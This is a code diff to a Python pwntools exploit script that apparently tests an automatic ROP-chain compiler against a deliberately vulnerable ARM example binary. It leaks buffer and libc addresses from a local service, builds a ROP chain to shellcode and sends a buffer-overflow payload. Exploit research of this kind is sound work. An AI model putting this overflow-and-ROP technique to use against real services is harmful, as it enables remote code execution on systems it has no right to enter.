@@ -3,15 +3,19 @@ import archinfo
 from pwn import *
 from rop_compiler import ropme
 
-filename = './example/arm_bof'
+filename = './example/arm_bof2'
+libc = './example/libc.so.6'
 #options = ['qemu-arm']
-options = ['ssh', 'armel']
-options.extend([filename, '3000'])
+#options = ['ssh', 'armel']
+#options.extend([filename, '3000'])
 #p = process(options)
 #gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40063f\nbreak *0x400641\nbreak *0x400643")
 p = remote('localhost', 2222)
 
+mprotect_address = 0xcade0
 buffer_address = struct.unpack("<I", p.read(4))[0]
+libc_address = struct.unpack("<I", p.read(4))[0] - mprotect_address
+print hex(libc_address)
 
 # TODO replay arm shellcode
 shellcode = (
@@ -33,6 +37,7 @@ print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_addre
 
 print "Using automatically built ROP chain"
 rop = ropme.rop_to_shellcode([(filename, 0)], target_address, archinfo.ArchARM, logging.DEBUG)
+#rop = ropme.rop_to_shellcode([(filename, 0), (libc, libc_address)], target_address, archinfo.ArchARM, logging.DEBUG)
 
 payload = 'A'*512 + 'B'*4 + rop
 payload += ((700 - len(payload)) * 'B') + shellcode
